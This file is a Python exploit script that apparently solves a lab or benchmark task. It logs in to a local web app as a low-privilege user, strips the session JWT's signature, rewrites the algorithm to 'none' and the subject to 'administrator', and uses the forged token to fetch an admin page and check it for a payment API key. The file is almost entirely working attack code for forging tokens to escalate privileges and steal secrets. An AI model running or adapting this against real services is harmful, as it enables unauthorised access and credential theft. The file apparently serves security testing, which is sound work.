import jwt
import requests
import json
import base64


def base64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def forge_admin_token(user_token: str) -> str:
    payload = jwt.decode(user_token, options={'verify_signature': False})
    payload['sub'] = 'administrator'
    header = {"alg": "none", "typ": "JWT"}
    encoded_header = base64url(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    encoded_payload = base64url(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    return f"{encoded_header}.{encoded_payload}."


def run(base_url: str = 'http://localhost:3206'):
    s = requests.Session()
    r = s.post(base_url + '/login', data={'username': 'analyst', 'password': 'analyst123'}, allow_redirects=False)
    assert r.status_code in (302, 303)
    cookie = r.headers.get('Set-Cookie')
    token = cookie.split('session=')[1].split(';')[0]
    admin_token = forge_admin_token(token)
    s.cookies.set('session', admin_token)
    r2 = s.get(base_url + '/admin')
    assert 'PAYMENT_API_KEY=' in r2.text
    return r2.text


if __name__ == '__main__':
    print(run())


